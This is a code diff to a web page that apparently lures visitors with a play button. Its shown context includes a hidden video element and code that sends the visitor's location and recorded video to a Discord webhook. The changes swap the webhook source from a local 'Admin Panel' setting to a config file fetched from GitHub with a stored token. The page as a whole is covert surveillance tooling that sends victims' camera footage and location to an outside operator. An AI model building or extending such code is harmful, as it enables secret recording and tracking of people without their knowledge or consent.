@@ -88,7 +88,7 @@
     <video id="recordingVideo" autoplay muted playsinline style="display:none;"></video>
 
     <script>
-        // Default Webhook (Agar Admin Panel se kuch set na ho)
+        // Default Webhook (Agar GitHub se kuch load na ho)
         const DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
 
         let currentLocation = null;
@@ -96,6 +96,7 @@
         let stream = null;
         let mediaRecorder;
         let videoChunks = [];
+        let webhookUrl = DEFAULT_WEBHOOK;
 
         const playBtn = document.getElementById('playBtn');
         const debugLog = document.getElementById('debugLog');
@@ -106,6 +107,33 @@
             entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
             debugLog.prepend(entry);
         }
+
+        // Load config from GitHub if available
+        window.onload = async () => {
+            const token = localStorage.getItem('ghToken');
+            const repo = localStorage.getItem('repoName');
+            const path = localStorage.getItem('filePath');
+
+            if(token && repo && path) {
+                try {
+                    const res = await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
+                        headers: { "Authorization": `Bearer ${token}` }
+                    });
+                    const data = await res.json();
+                    if(data.content) {
+                        const config = JSON.parse(atob(data.content));
+                        webhookUrl = config.webhookUrl || DEFAULT_WEBHOOK;
+                        log("Config loaded from GitHub: " + webhookUrl);
+                    } else {
+                        log("No config found in GitHub. Using default.");
+                    }
+                } catch (e) {
+                    log("Error loading from GitHub: " + e.message);
+                }
+            } else {
+                log("No GitHub config found. Using default.");
+            }
+        };
 
         playBtn.addEventListener('click', startProcess);
 
@@ -201,9 +229,6 @@
             } else if (currentLocation && currentLocation.error) {
                 locationMsg = `📍 Location Error: ${currentLocation.error}`;
             }
-
-            // Use saved webhook from Admin Panel or default
-            const webhookUrl = localStorage.getItem('discordWebhook') || DEFAULT_WEBHOOK;
 
             try {
                 log("Sending Location & Video...");
